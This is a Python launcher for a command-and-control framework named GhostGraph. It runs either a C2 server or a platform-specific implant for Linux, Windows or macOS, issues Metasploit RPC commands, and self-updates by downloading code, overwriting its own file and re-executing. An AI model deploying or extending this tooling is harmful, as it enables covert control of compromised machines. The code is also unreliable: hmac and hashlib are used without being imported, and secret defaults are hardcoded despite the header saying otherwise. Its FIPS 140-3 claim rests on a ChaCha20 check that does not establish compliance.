# ghostgraph.py
# Top-level unified entry point for GhostGraph C2 framework
# CLI args for mode (server/implant), profile/env config, logging init,
# graceful shutdown, version check. Runs server or implant based on arg (default: server).
# Secure env loading (no defaults in code), FIPS crypto init, audit startup.
# New: Metasploit integration (RPC via msfrpc-like client), auto-update (git pull/download),
# expanded CLI (--update, --msf-host/port/user/pass/command for MSF ops).
# Usage: python ghostgraph.py --mode server --profile stealth --msf-command "core.version"

import asyncio
import argparse
import os
import sys
import logging
import structlog
import signal
import subprocess  # For git update
import requests  # For download update/MSF
import msgpack  # For MSF RPC
import json
import platform
from datetime import datetime
from pathlib import Path
from server.server import GhostGraphServer
from implants.base_implant import BaseImplant
from implants.linux_implant import LinuxImplant
from implants.windows_implant import WindowsImplant
from implants.macos_implant import MacOSImplant
from config.profiles import validate_profile, CTF_PROFILES, SERVER_PROFILES, IMPLANT_SCHEMA, SERVER_SCHEMA
from cryptography.hazmat.backends import default_backend  # FIPS init check
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# Structured logging setup (self-contained)
structlog.configure(processors=[structlog.processors.JSONRenderer()])
logger = structlog.get_logger()

# Version (for checks/updates)
VERSION = '2.0-gov'
UPDATE_URL = 'https://example.com/ghostgraph/update.py'  # Prod: Secure repo URL
UPDATE_SECRET = os.getenv('GG_UPDATE_SECRET', 'update-secret')  # For signature

# Metasploit RPC Client (self-contained; based on MSGRPC HTTP/MsgPack)
class MsfRpcClient:
    def __init__(self, host='127.0.0.1', port=55553, user='msf', password='pass'):
        self.host = host
        self.port = port
        self.token = None
        self._login(user, password)
    
    def _call(self, method, params=[]):
        data = msgpack.packb([method] + ([self.token] if self.token else []) + params)
        headers = {'Content-Type': 'application/msgpack'}
        url = f"http://{self.host}:{self.port}/api/1.0"
        resp = requests.post(url, data=data, headers=headers)
        if resp.status_code == 200:
            return msgpack.unpackb(resp.content, raw=False)
        raise ValueError(f"MSF RPC error: {resp.text}")
    
    def _login(self, user, password):
        res = self._call('auth.login', [user, password])
        self.token = res.get('token')
        if not self.token:
            raise ValueError("MSF login failed")
    
    def execute(self, command, *args):
        return self._call(command, list(args))

# Global shutdown event
shutdown_event = asyncio.Event()

def parse_args():
    parser = argparse.ArgumentParser(description="GhostGraph C2 Framework - Top-Level Runner")
    parser.add_argument('--mode', choices=['server', 'implant'], default='server', help="Run as server or implant (default: server)")
    parser.add_argument('--profile', default='stealth', help="Config profile (stealth/aggressive/test)")
    parser.add_argument('--secret', default=os.getenv('GG_SECRET'), help="Shared secret (env GG_SECRET fallback)")
    parser.add_argument('--port', type=int, default=int(os.getenv('GG_PORT', 5000)), help="Dashboard port (server mode)")
    parser.add_argument('--allowed-ips', default=os.getenv('GG_ALLOWED_IPS', ''), help="Comma-separated IPs (server)")
    parser.add_argument('--log-level', default='INFO', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], help="Logging level")
    parser.add_argument('--update', action='store_true', help="Auto-update framework via git or download")
    parser.add_argument('--msf-host', default='127.0.0.1', help="Metasploit RPC host")
    parser.add_argument('--msf-port', type=int, default=55553, help="Metasploit RPC port")
    parser.add_argument('--msf-user', default='msf', help="Metasploit RPC user")
    parser.add_argument('--msf-pass', default='pass', help="Metasploit RPC password")
    parser.add_argument('--msf-command', default=None, help="Metasploit RPC command (e.g., 'core.version')")
    parser.add_argument('--msf-args', nargs='*', default=[], help="Args for MSF command (space-separated)")
    parser.add_argument('--version', action='version', version=f"GhostGraph {VERSION}")
    return parser.parse_args()

def setup_logging(level: str):
    """Setup logging with level from args/env."""
    logging.basicConfig(level=level, format='%(asctime)s - %(message)s')
    logger.info("Logging initialized", level=level)

def auto_update():
    """Auto-update: Git pull or download from URL, verify signature (HMAC), atomic replace, restart."""
    try:
        # Git update (preferred)
        subprocess.check_call(['git', 'pull', 'origin', 'master'])
        logger.info("Git update successful")
    except Exception as e:
        logger.warning(f"Git update failed: {e}; trying download")
        # Fallback download
        resp = requests.get(UPDATE_URL)
        if resp.status_code == 200:
            new_code = resp.text
            # Verify HMAC (SP 800-53 SC-8)
            sig = resp.headers.get('X-Update-Sig')
            expected = hmac.new(UPDATE_SECRET.encode(), new_code.encode(), hashlib.sha256).hexdigest()
            if sig == expected:
                # Atomic replace: Temp file
                temp_path = __file__ + '.tmp'
                with open(temp_path, 'w') as f:
                    f.write(new_code)
                os.replace(temp_path, __file__)
                logger.info("Download update applied")
            else:
                logger.error("Update signature invalid")
                return
        else:
            logger.error("Update download failed")
    # Restart (prod: systemd/supervisor)
    os.execv(sys.executable, [sys.executable] + sys.argv)
    logger.info("Restarting after update")

async def integrate_metasploit(args):
    """Integrate with Metasploit: Run RPC command, return result."""
    try:
        client = MsfRpcClient(args.msf_host, args.msf_port, args.msf_user, args.msf_pass)
        res = client.execute(args.msf_command, *args.msf_args)
        logger.info("MSF RPC result", command=args.msf_command, result=res)
        print(json.dumps(res, indent=2))
    except Exception as e:
        logger.error(f"MSF integration failed: {e}")
        sys.exit(1)

async def main():
    args = parse_args()
    setup_logging(args.log_level)
    
    # Secure secret check (SP 800-53 SC-12: Key mgmt)
    if not args.secret:
        logger.error("Missing shared_secret (set --secret or GG_SECRET env)")
        sys.exit(1)
    
    base_config = {
        'shared_secret': args.secret,
        'allowed_ips': args.allowed_ips.split(',') if args.allowed_ips else [],
        'dashboard_port': args.port,
        'profile': args.profile
    }
    
    # FIPS backend validation (140-3 IG 2.1: Approved modes)
    backend = default_backend()
    if not backend.cipher_supported(ChaCha20Poly1305(os.urandom(32)), os.urandom(12)):
        logger.error("FIPS backend invalid: ChaCha20 not supported")
        sys.exit(1)
    logger.info("FIPS 140-3 backend validated")
    
    # Auto-update if flagged
    if args.update:
        auto_update()
    
    # Metasploit integration if command provided
    if args.msf_command:
        await integrate_metasploit(args)
        sys.exit(0)
    
    # Mode selection
    if args.mode == 'server':
        # Validate server config
        config = validate_profile(args.profile, SERVER_PROFILES, SERVER_SCHEMA, base_config)
        server = GhostGraphServer(base_config)  # Pass base_config as per server.py
        await server.run()
    elif args.mode == 'implant':
        # Validate implant config
        config = validate_profile(args.profile, CTF_PROFILES, IMPLANT_SCHEMA, base_config)
        # Implant load and run (inline from provided main_implant.py, adapted to async)
        system = platform.system().lower()
        if system == 'linux':
            implant = LinuxImplant(config)
        elif system == 'windows':
            implant = WindowsImplant(config)
        elif system == 'darwin':
            implant = MacOSImplant(config)
        else:
            implant = BaseImplant(config)
        await implant.async_run()  # Call async_run directly (assumed in BaseImplant)
    
    # Audit startup
    logger.info("GhostGraph started", mode=args.mode, profile=args.profile, version=VERSION, timestamp=datetime.utcnow().isoformat())

# Graceful shutdown
def shutdown(sig):
    logger.info(f"Signal {sig} received; shutting down")
    asyncio.get_event_loop().stop()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, shutdown, sig)
    
    # PID file (prod: /var/run)
    pid_file = Path('/var/run/ghostgraph.pid')
    try:
        pid_file.write_text(str(os.getpid()))
    except:
        logger.warning("PID file write failed")
    
    # Run
    try:
        loop.run_until_complete(main())
    finally:
        try:
            pid_file.unlink()
        except:
            pass
        logger.info("GhostGraph shutdown")
